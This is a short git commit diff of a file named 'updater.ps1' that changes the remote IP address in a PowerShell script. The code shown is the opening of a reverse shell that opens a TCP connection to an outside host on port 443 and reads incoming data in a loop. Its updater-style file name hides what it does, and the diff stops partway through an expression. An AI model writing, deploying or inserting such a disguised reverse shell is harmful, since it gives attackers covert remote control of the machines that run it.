444de9da8275487f948c66eeeebcaaea88ba39d7
secnotes <36083279+secnotes@users.noreply.github.com>
2021-06-04 14:11:56 -0400

    Update updater.ps1

--- updater.ps1
+++ updater.ps1
@@ -1,4 +1,4 @@
-$client = New-Object System.Net.Sockets.TCPClient("3.134.109.250", 443); `
+$client = New-Object System.Net.Sockets.TCPClient("18.219.201.55", 443); `
 $stream = $client.GetStream();[ byte []] $bytes = 0..65535|%{0}; `
 while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {; $data `
 = (New-Object -TypeName System.Text.ASCIIEncoding).GetString( `
